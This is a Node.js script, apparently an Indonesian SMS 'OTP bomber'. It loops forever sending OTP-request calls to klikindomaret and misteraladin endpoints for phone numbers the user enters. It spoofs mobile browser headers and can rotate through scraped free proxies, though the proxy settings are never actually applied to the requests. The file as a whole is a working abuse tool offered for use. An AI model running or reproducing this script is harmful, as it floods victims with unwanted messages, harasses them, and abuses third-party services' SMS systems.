const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

async function scrapeFreeProxies() {
  const proxyListUrl = 'https://www.sslproxies.org/';

  try {
    const response = await axios.get(proxyListUrl);
    const $ = cheerio.load(response.data);
    const proxyRows = $('#proxylisttable tbody tr');

    const proxies = [];
    proxyRows.each((index, element) => {
      const ip = $(element).find('td:nth-child(1)').text().trim();
      const port = $(element).find('td:nth-child(2)').text().trim();
      const proxy = `${ip}:${port}`;
      proxies.push(proxy);
    });

    return proxies;
  } catch (error) {
    console.error("Error scraping free proxies:", error.message);
    return [];
  }
}

async function checkProxyValidity(proxy) {
  const [ip, port] = proxy.split(":");
  try {
    const response = await axios.get("https://www.example.com", {
      proxy: {
        host: ip,
        port: parseInt(port),
      },
      timeout: 5000,
    });
    if (response.status === 200) {
      return true;
    } else {
      return false;
    }
  } catch (error) {
    return false;
  }
}

async function sendGetRequestWithDelay(url, headers, delaySeconds) {
  try {
    const response = await axios.get(url, { headers });
    if (response.status >= 200 && response.status <= 299) {
      console.log(`GET request to ${url} was successful.`);
    } else {
      console.log(`GET request to ${url} failed with status code: ${response.status}`);
    }
    console.log(response.data);
  } catch (error) {
    console.error("Error sending GET request:", error.message);
  }

  await new Promise((resolve) => setTimeout(resolve, delaySeconds * 1000));
}

async function sendPostRequestWithDelay(url, data, headers, delaySeconds) {
  try {
    const response = await axios.post(url, data, { headers });
    if (response.status >= 200 && response.status <= 299) {
      console.log(`POST request to ${url} was successful.`);
    } else {
      console.log(`POST request to ${url} failed with status code: ${response.status}`);
    }
    console.log(response.data);
  } catch (error) {
    console.error("Error sending POST request:", error.message);
  }

  await new Promise((resolve) => setTimeout(resolve, delaySeconds * 1000));
}

async function sendRequests(phoneNumbers, useProxy, delaySeconds, proxies) {
  const klikindomaretUrl = "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=";
  const misteraladinUrl = "https://m.misteraladin.com/api/members/v2/otp/request";

  const misteraladinHeaders = {
    "Host": "m.misteraladin.com",
    "accept-language": "id",
    "sec-ch-ua-mobile": "?1",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "x-platform": "mobile-web",
    "sec-ch-ua-platform": "Android",
    "origin": "https://m.misteraladin.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://m.misteraladin.com/account",
    "accept-encoding": "gzip, deflate, br",
  };

  let proxyIndex = 0;
  while (true) {
    for (const phoneNumber of phoneNumbers) {
      let headers = {
        "Host": "account-api-v1.klikindomaret.com",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://account.klikindomaret.com",
        "referer": `https://account.klikindomaret.com/SMSVerification?nohp=${phoneNumber}&type=register`,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
      };

      if (useProxy) {
        const proxy = proxies[proxyIndex % proxies.length];
        const [ip, port] = proxy.split(":");
        const proxyConfig = {
          host: ip,
          port: parseInt(port),
          protocol: 'http'
        };
        proxyIndex++;

        try {
          await sendGetRequestWithDelay(`${klikindomaretUrl}${phoneNumber}`, headers, useProxy ? delaySeconds : 30, proxyConfig);
          await sendPostRequestWithDelay(misteraladinUrl, { "phone_number_country_code": "62", "phone_number": phoneNumber, "type": "register" }, misteraladinHeaders, useProxy ? delaySeconds : 30, proxyConfig);
        } catch (error) {
          console.error(`Error sending requests using proxy ${proxy}:`, error.message);
        }

      } else {
        await sendGetRequestWithDelay(`${klikindomaretUrl}${phoneNumber}`, headers, delaySeconds);
        await sendPostRequestWithDelay(misteraladinUrl, { "phone_number_country_code": "62", "phone_number": phoneNumber, "type": "register" }, misteraladinHeaders, delaySeconds);
      }
    }
  }
}

function readProxyListFile(filePath) {
  const proxyList = fs.readFileSync(filePath, 'utf-8').split('\n');
  return proxyList.filter((proxy) => proxy.trim() !== '');
}

function saveProxiesToFile(filePath, proxies) {
  const data = proxies.join('\n');
  fs.writeFileSync(filePath, data);
  console.log(`Proxies saved to ${filePath}`);
}

rl.question('Enter phone numbers separated by commas: ', (input) => {
  const phoneNumbers = input.split(",").map((number) => number.trim());

  rl.question('Select option:\n - 1. With Proxy\n - 2. Proxyless Mode\n - 3. Scrape FREE Proxy\n Silahkan Pilih Salah Satu: ', async (option) => {
    if (option === '1') {
      rl.question('Enter delay in seconds between requests with proxy: ', async (delaySeconds) => {
        const proxies = readProxyListFile('proxylist.txt');
        if (proxies.length === 0) {
          console.log("No proxies found in proxylist.txt.");
        } else {
          await sendRequests(phoneNumbers, true, parseInt(delaySeconds), proxies);
        }
        rl.close();
      });
    } else if (option === '2') {
      sendRequests(phoneNumbers, false, 30);
      rl.close();
    } else if (option === '3') {
      rl.question('Enter delay in seconds between requests with free proxy: ', async (delaySeconds) => {
        const freeProxies = await scrapeFreeProxies();
        if (freeProxies.length === 0) {
          console.log("No free proxies found or error occurred while scraping.");
        } else {
          saveProxiesToFile('newproxy.txt', freeProxies);
          await sendRequests(phoneNumbers, true, parseInt(delaySeconds), freeProxies);
        }
        rl.close();
      });
    } else {
      console.log("Invalid option selected. Exiting.");
      rl.close();
    }
  });
});
